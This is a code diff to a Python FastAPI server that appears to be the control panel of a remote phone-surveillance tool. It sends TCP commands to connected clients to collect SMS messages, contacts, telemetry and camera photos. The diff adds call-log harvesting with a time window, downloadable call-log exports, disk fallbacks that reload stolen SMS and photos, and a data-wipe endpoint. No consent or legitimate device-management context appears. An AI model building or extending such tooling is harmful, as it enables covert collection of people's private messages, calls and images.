@@ -14,6 +14,7 @@ from app.logger import clear_logs, get_logs, log_info
 from app.state import state
 from app.tcp.commands import (
     cmd_disconnect,
+    cmd_get_call_logs,
     cmd_get_contacts,
     cmd_get_sms,
     cmd_get_telemetry,
@@ -47,6 +48,7 @@ async def api_status() -> Dict[str, Any]:
         "has_photo": state.latest_photo_bytes is not None if settings.enable_camera else False,
         "has_contacts": state.latest_contacts_bytes is not None,
         "sms_count": len(state.latest_sms),
+        "call_logs_count": len(state.latest_call_logs),
         "contacts_count": len(state.contacts_list),
         "has_telemetry": state.latest_telemetry is not None,
         "telemetry": state.latest_telemetry,
@@ -117,7 +119,17 @@ async def api_client_sms(payload: Optional[Dict[str, Any]] = None) -> Dict[str, 
 
 @router.get("/sms/latest")
 async def api_sms_latest() -> List[Dict[str, Any]]:
-    return state.latest_sms
+    if state.latest_sms:
+        return state.latest_sms
+    dest = settings.storage_dir / "latest_sms.json"
+    if dest.exists():
+        try:
+            data = json.loads(dest.read_text(encoding="utf-8"))
+            state.latest_sms = data
+            return data
+        except Exception:
+            pass
+    return []
 
 
 @router.get("/sms/download")
@@ -128,6 +140,48 @@ async def api_sms_download() -> Response:
         media_type="application/json",
         headers={"Content-Disposition": "attachment; filename=sms_messages.json"},
     )
+
+
+@router.post("/client/call_logs")
+async def api_client_call_logs(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    hours = 24
+    if payload and "hours" in payload:
+        try:
+            hours = int(payload["hours"])
+        except Exception:
+            hours = 24
+    return await cmd_get_call_logs(hours)
+
+
+@router.get("/call_logs/latest")
+async def api_call_logs_latest() -> List[Dict[str, Any]]:
+    if state.latest_call_logs:
+        return state.latest_call_logs
+    dest = settings.storage_dir / "latest_call_logs.json"
+    if dest.exists():
+        try:
+            data = json.loads(dest.read_text(encoding="utf-8"))
+            state.latest_call_logs = data
+            return data
+        except Exception:
+            pass
+    return []
+
+
+@router.get("/call_logs/download")
+async def api_call_logs_download() -> Response:
+    content = json.dumps(state.latest_call_logs, indent=2, ensure_ascii=False).encode("utf-8")
+    return Response(
+        content=content,
+        media_type="application/json",
+        headers={"Content-Disposition": "attachment; filename=call_logs.json"},
+    )
+
+
+@router.post("/data/clear")
+async def api_data_clear() -> Dict[str, str]:
+    state.clear_all_data()
+    return {"status": "cleared"}
 
 
 @router.post("/client/cameras")
@@ -163,6 +217,15 @@ async def api_photo_latest() -> Response:
         return Response(content=b"", status_code=404)
     if state.latest_photo_bytes:
         return Response(content=state.latest_photo_bytes, media_type="image/jpeg")
+    try:
+        photos = sorted(settings.storage_dir.glob("photo_*.jpg"), key=lambda p: p.stat().st_mtime, reverse=True)
+        if photos:
+            data = photos[0].read_bytes()
+            state.latest_photo_bytes = data
+            state.latest_photo = str(photos[0])
+            return Response(content=data, media_type="image/jpeg")
+    except Exception:
+        pass
     return Response(content=b"", status_code=404)
 
 
